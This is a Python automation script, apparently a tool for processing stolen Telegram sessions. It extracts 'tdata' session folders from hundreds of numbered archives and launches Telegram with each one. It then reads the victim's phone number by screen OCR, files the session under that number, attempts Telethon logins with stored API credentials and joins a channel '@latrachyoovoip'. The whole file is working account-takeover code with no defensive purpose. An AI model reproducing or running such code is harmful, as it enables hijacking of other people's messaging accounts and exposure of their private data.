
import pyscreenshot as ImageGrab
import pytesseract
import pyautogui
from time import sleep
import telethon
from pyunpack import Archive

from telethon.sync import TelegramClient
from pathlib import Path

from telethon.tl.functions.channels import JoinChannelRequest
import random,string,requests,shutil,os,zipfile
global cookie,r,text,hash,api_id, numero,newpath
def ricerca(numero):
    numero = numero.replace("+","")
    print(numero)
    file = open(r"C:\RASPAYOO\accdata\last.txt","r")
    ind = int(file.read())
    file.close()
    ver = 0
    for k in range(1,ind):
        file3 = open(r"C:\RASPAYOO\accdata\acc"+str(k)+".txt","r")
        line = file3.read()
        file3.close()
        if numero in line:
            ver += 1
            print("acc"+ str(k))
            file2 = open("G:\\tgdatabase\\+"+numero+"\\acc"+str(k)+".txt","w")
            data = line
            dati = data.split(";")
            client = TelegramClient("C:\\RASPAYOO\\accdatasess\\" + dati[0], dati[1], dati[2])
            client.connect()
            if not client.is_user_authorized():
                try:
                    client.send_code_request(numero)
                    try:
                        try:
                            os.startfile("G:\\tgdatabase\\+" + numero + "\\Telegram.exe")
                        except:
                            pass
                        client.sign_in(numero, input("codice: "))
                        os.system("TASKKILL /F /IM telegram.exe")
                    except telethon.errors.SessionPasswordNeededError:
                        print('pass requered')
                        file1 = open("G:\\tgdatabase\\+" + numero + "\\pwreq.txt", "w")
                        file1.write("password")
                        file1.close()
                except telethon.errors.rpcerrorlist.ApiIdInvalidError:
                    print("api | hash non valido")
                    file = open(r"C:\Users\latra\Desktop\fileresult.txt", "r")
                    line = file.read()
                    file.close()
                    file = open(r"C:\Users\latra\Desktop\fileresult.txt", "w")
                    file.write(line + numero + ";" + "acc"+ str(k))
                    file.close()
            else:
                print('num check passed')
                try:
                    client(JoinChannelRequest("@latrachyoovoip"))
                except:
                    pass
                os.system("TASKKILL /F /IM telegram.exe")
                file2.write(line)
                file2.close()
    if ver <1:
        print('non trovato')
        file = open("G:\\tgdatabase\\+"+numero+"\\notregistred.txt","w")
        file.close()
try:
    file = open(r"G:\tgdatabase\ultimo.txt", "r")
    indice = int(file.read())
    file.close()
except:
    indice = 1
numero = ""

for d in range(indice,1015):
    print('zip num: ', d)

    try:
        try:
            os.system("TASKKILL /F /IM telegram.exe")
        except Exception as e:

            print(e)


        try:
            try:
                os.mkdir("G:\\tgdatabase\\" + str(d))
            except:
                print()
            try:
                shutil.rmtree(r"C:\Users\latra\Desktop\extract")
            except Exception as e:

                print(e)
            try:
                os.mkdir(r"C:\Users\latra\Desktop\extract")
            except Exception as e:

                print(e)


        except Exception as e:

            print(e)
        try:

            Archive("G:\\filedata\\" + str(d) + ".zip").extractall(r"C:\Users\latra\Desktop\extract")
        except Exception as e:
            try:
                os.rename("G:\\filedata\\" + str(d) + ".zip","G:\\filedata\\" + str(d) + ".rar")
            except:
                pass
            Archive("G:\\filedata\\" + str(d) + ".rar").extractall(r"C:\Users\latra\Desktop\extract")
        try:
            p = Path(r"C:\Users\latra\Desktop\extract")
            subdirectories = [x for x in p.iterdir() if x.is_dir()]
            newpath = subdirectories[-1]
        except Exception as e:

            print(e)
        try:
            if "tdata" in str(newpath):
                destination = shutil.copytree(str(str(newpath)),
                                              "G:\\tgdatabase\\" + str(d) + "\\tdata")
            else:
                destination = shutil.copytree(str(str(newpath) + "\\tdata"),
                                              "G:\\tgdatabase\\" + str(d) + "\\tdata")
        except Exception as e:

            print(e)
        try:
            try:
                try:
                    shutil.copy("G:\\filedata\\" + str(d) + ".zip",
                                "G:\\tgdatabase\\" + str(d))
                except:
                    shutil.copy("G:\\filedata\\" + str(d) + ".rar",
                                "G:\\tgdatabase\\" + str(d))
            except Exception as e:
                print(e)

            shutil.copy(r"C:\Users\latra\Desktop\telegram\Telegram.exe",
                        "G:\\tgdatabase\\" + str(d))
        except Exception as e:

            print(e)
        try:
            os.system("cmd /c start /max G:\\tgdatabase\\" + str(d) + "\\Telegram.exe")
            sleep(5)
            pyautogui.click(x=1107, y=1048)
            pyautogui.click(x=1107, y=1048)
            pyautogui.click(x=1107, y=1048)
            pyautogui.click(x=1107, y=1048)
            sleep(2)
            pyautogui.click(x=400, y=500)
            sleep(3)
            pyautogui.click(20, 47)
            sleep(2)
            im = ImageGrab.grab(bbox=(20, 100, 200, 150))
            im.save(r"C:\Users\latra\Desktop\prova1.png")
            sleep(2)
            pyautogui.click(x=1107, y=1048)
            pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract'
            string = (pytesseract.image_to_string(r"C:\Users\latra\Desktop\prova1.png"))
            ver = False
            c = 0
            newnum = ""
            cont = 0

            for k in string:
                # print(k)
                if k == "+" or k == "#" or k == "4" or k == "7":
                    ver = True
                if ver and cont < 2:
                    if k != " ":
                        cont = 0
                        newnum = newnum + k
                    else:
                        cont += 1

            if str(newnum)[0:1] == "4" or str(newnum)[0:1] == "7":
                newnum = "+" + str(newnum)[1:len(newnum)]
            newnum = newnum.replace("#", "+").strip()
            newnum = newnum.replace(" ", "").strip()
            newnum = newnum.replace(".", "").strip()
            newnum = newnum.replace(":", "").strip()
            numero = newnum
            if len(numero) < 5:
                numero = "notlogged" + str(d)
            nummom = numero.replace("+","")
            nummom = "+" + nummom
            os.system("TASKKILL /F /IM telegram.exe")
            sleep(3)
            os.rename("G:\\tgdatabase\\" + str(d),
                      "G:\\tgdatabase\\+" + nummom)
        except Exception as e:

            print(e)

    except Exception as e:

        print(e)
    if numero != "notlogged" + str(d):
        ricerca(numero)
    else:
        print("wall")
    indice += 1
    file = open(r"G:\tgdatabase\ultimo.txt", "w")
    file.write(str(indice))
    file.close()
    try:
        try:
            os.remove("G:\\tgdatabase\\" + numero + "\\Telegram.exe")

        except:
            os.remove("G:\\tgdatabase\\" + str(d)+ "\\Telegram.exe")
    except Exception as e:
        print(e)
        print("woah")

